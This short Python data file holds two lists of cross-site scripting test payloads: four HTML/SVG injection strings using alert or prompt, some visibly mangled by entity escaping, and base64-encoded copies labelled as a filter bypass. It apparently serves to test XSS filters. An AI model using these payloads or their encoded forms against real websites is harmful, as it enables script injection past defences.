
signature_based = [
	'<svg><script>alert&grave;1&grave;<p>',
	'''&lt;dialog open="" onclose="alertundefined1)"&gt;
	&lt;form method="dialog"&gt;
	&lt;button&gt;Close me!&lt;/button&gt;&lt;/form&gt;&lt;/dialog&gt;''',
	'&lt;svg&gt;&lt;script&gt;prompt&amp;#40 1&amp;#41&lt;i&gt;',
	'&lt;a href="&amp;#1;javascript:alertundefined1)"&gt;CLICK ME&lt;a&gt;',]
encoded_bypass = [
	'PHN2Zz48c2NyaXB0PmFsZXJ0JmdyYXZlOzEmZ3JhdmU7PHA+',
	'''Jmx0O2RpYWxvZyBvcGVuPSIiIG9uY2xvc2U9ImFsZXJ0dW5kZWZpbmVkMSkiJmd
	0OwombHQ7Zm9ybSBtZXRob2Q9ImRpYWxvZyImZ3Q7CiZsdDtidXR0b24mZ3Q7Q2xvc
	2UgbWUhJmx0Oy9idXR0b24mZ3Q7Jmx0Oy9mb3JtJmd0OyZsdDsvZGlhbG9nJmd0Ow==''',
	'Jmx0O3N2ZyZndDsmbHQ7c2NyaXB0Jmd0O3Byb21wdCZhbXA7IzQwIDEmYW1wOyM0MSZsdDtpJmd0Ow==',
	'Jmx0O2EgaHJlZj0iJmFtcDsjMTtqYXZhc2NyaXB0OmFsZXJ0dW5kZWZpbmVkMSkiJmd0O0NMSUNLIE1FJmx0O2EmZ3Q7']

